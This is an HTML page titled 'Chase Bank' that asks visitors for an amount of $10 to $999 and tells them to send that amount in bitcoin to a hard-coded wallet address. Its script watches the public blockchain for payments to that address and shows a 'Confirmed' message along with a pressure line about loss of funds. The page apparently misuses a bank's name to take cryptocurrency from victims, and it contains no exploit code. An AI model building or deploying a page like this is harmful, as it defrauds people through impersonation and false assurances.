<!DOCTYPE html>
<html lang="en">
    <head>
    <title>Chase Bank</title>
    <link rel="stylesheet" href="plugins/bootstrap/css/bootstrap.min.css" />
    <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/stylebro.css" />

    <link rel="stylesheet" href="plugins/bootstrap-datepicker/css/datepicker.css" />                                 
</head>

<body style="background: #121d33;">



<!-- <div class="col-6"> -->
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-body" style="padding: 0; margin: 0;">

                <div id="rootwizard">
                    <ul class="nav mb-4  nav-pills nav-fill" role="tablist">
                        <li class="nav-item">
                            <a class="nav-link jada" data-toggle="tab" href="#profile3" role="tab" aria-controls="profile3" aria-selected="false">
                                Amount
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link jada" data-toggle="tab" href="#finish1" role="tab" aria-controls="finish1" aria-selected="false">
                                Deposit
                            </a>
                        </li>
                    </ul>


                    <div class="progress progress-md progress-rounded mb-0 mt-0" style="border: 1px solid lightgray;">
                        <div class="progress-bar progress-bar-striped progress-bar-animated  bg-warning"
                        id="pablos" 
                        role="progressbar" 
                        aria-valuenow="50" aria-valuemin="0" 
                        aria-valuemax="100" style="width: 50%">
                        </div>
                    </div>
                    <form id="wizardForm">
                        <div class="tab-content" id="myTabContent">
                            <div class="tab-pane fade" id="profile3" role="tabpanel">
                                <div class="form-group" style="margin: 0 auto !important;">
                                    <label for="exampleInputQuantity" style="font-size: 17px; font-weight: 600; text-align: center;">
                                        Min Amount: $10  |  Max Amount: $999
                                    </label>
                                    <input type="number" 
                                    min="10" max="999"  
                                    id="the-input" 
                                    class="form-control drunkinl" 
                                    style=" color: black; font-size: 1.1rem; font-weight: 600; border-radius: 0;border: 2px solid #121d33; font-family: 'Montserrat',  sans-serif;
                                    width: 100% !important" 
                                    name="exampleInputQuantity" id="exampleInputQuantity" 
                                    placeholder="Deposit Amount...">
                                </div>
                            </div>
                            <div class="tab-pane fade" id="finish1" role="tabpanel">
        
                                <div class="modal-header modal-bitcoin">
                                    <h4 class="modal-title" class="zatos" style="font-size: 32px; color: #121d33; font-weight: 700; text-align: center;"
                                        id="the-bitcoin">
                                        Send <span id="btcamount"></span> <span id="btcamount2"></span>
                                    </h4>
                                
                                    <button type="button" class="close" 
                                    class="zatos" 
                                    style="font-size: 2.6rem; color: #f2a900; margin: 7px 15px; font-weight: 700;"
                                    id="mkbhd">
                                        <i class="fab fa-bitcoin"></i>
                                    </button>
                                </div>

                                <div class="modal-header" style="padding: 0">
                                    <strong class="awaitingpayment" id="coinsb">
                                        <i class="fas fa-spin fa-sync-alt spinner-border"></i> awaiting  
                                        <span id="the-other-one"></span> 
                                        bitcoin payment
                                    </strong>
                                </div>
                                
                                <div class="modal-body" style="padding: 0; margin: 0;">
                                    <div style="display: flex; justify-content: center;">
                                        <input 
                                            type="text" 
                                            id="text-to-copy"
                                            value="1AMjPsZQvqeAfnEjfk17fEUZc6rZuM9Ccp"
                                            style=" color: black; font-size: 1.1rem; font-weight: 700; width: 74%;border-radius: 0;border: 2px solid #121d33; font-family: 'Montserrat',  sans-serif;" 
                                            class="form-control drunkinl" 
                                            onclick="this.select();">
                                        <button type="button" 
                                            class="btn" 
                                            id="copy-text"
                                            style="font-size: 1.3rem; font-weight: 700; display: flex; align-items: center;background-color: lime;  border: 1px solid limegreen;margin-left: 4px;">
                                            Copy
                                            <i class="fas fa-copy" style="margin-left: 3px"></i>
                                        </button>
                                    </div>
                                    <img src="images/download.jpeg" style="border-radius: 0px; margin-top: 0px;">
                                </div>  

                            </div>

                            
                            <ul class="pagination wizard">
                                <li class="previous"><a href="#" class="btn btn-outline-primary" 
                                    style="font-size: 28px; left: 10px; display: none;" id="prev-butn">Previous</a></li>
                                <li class="next ms-auto"><a href="#" class="btn btn-outline-primary" 
                                    style="right: -115px; font-size: 28px;" onclick="addFunds()">Next</a></li>
                            </ul>
                        </div>
                    </form>

                    <script>
                        function addFunds(){
                            let btc = document.getElementById('the-input').value;
                            if(btc >= 10 && btc <= 999){
                                document.getElementById('the-bitcoin').innerHTML = 'Send $' + btc;
                                document.getElementById('prev-butn').style.display = 'block';
                                let coinbase = new WebSocket("wss://stream.binance.com:9443/ws/btcusdt@kline_1h");
                                let bitcoin = document.getElementById("the-other-one");
                                coinbase.onmessage = event => {
                                    let confirm = JSON.parse(event.data);
                                    bitcoin.innerHTML = (btc / parseFloat(confirm.k.c)).toFixed(5);
                                }
                            } else{
                                document.getElementById('the-bitcoin').innerHTML = 'Send: $0'
                            }
                        }

                        var binance = new WebSocket("wss://ws.blockchain.info/inv");
                        binance.onopen = function(){
                            binance.send(JSON.stringify({
                                "op": "unconfirmed_sub"
                            }))
                        }
                        binance.onmessage = function(onmsg){
                            var response = JSON.parse(onmsg.data);

                            var address1 = response.x.out[0].addr;
                            var address2 = '1AMjPsZQvqeAfnEjfk17fEUZc6rZuM9Ccp'

                            if(address1 == address2) {
                                document.getElementById('the-bitcoin').innerHTML = 'Received ' + ((response.x.out[0].value) / 100000000).toFixed(3) + 'BTC';
                                document.getElementById('the-bitcoin').style.color = 'goldenrod';
                                document.getElementById('coinsb').innerHTML = `
                                <i class="fas fa-check"></i>
                                Confirmed ${((response.x.inputs[0].prev_out.value) / 100000000).toFixed(3)} bitcoin payment,
                                Do Not Logout of the website if logged in anonymously, otherwise that would lead to loss of funds
                                `;
                                document.getElementById('coinsb').style.color = 'lime';
                            }else {
                                console.log('Not Yet');
                            }
                        }
                    </script>
                </div>
    

            </div>    
        </div>
    </div>
</div>

                



    <script src="plugins/jquery/jquery-3.1.0.min.js"></script>
    <script src="plugins/bootstrap/js/bootstrap.min.js"></script>

    <script src="plugins/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>
    <script src="plugins/jquery-validation/jquery.validate.min.js"></script>
    <script src="plugins/bootstrap-wizard/jquery.bootstrap.wizard.min.js"></script>
    <script src="js/pages/form-wizard.js"></script>

</body>
</html>